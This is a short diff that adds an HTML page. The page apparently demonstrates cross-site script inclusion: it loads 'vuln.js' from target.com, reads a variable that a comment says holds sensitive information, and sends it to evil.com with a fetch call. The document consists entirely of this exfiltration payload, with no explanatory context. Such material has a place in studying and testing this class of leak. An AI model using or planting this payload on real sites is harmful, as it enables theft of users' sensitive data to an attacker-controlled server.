@@ -1,0 +1,8 @@
+<script src="https://target.com/vuln.js">
+</script>
+<script defer>
+// var_name is a variable in vuln.js holding sensitive information
+console.log(var_name);
+// sending information to an attacker controlled server
+fetch("https://evil.com/stealInfo?info="+var_name);
+</script>
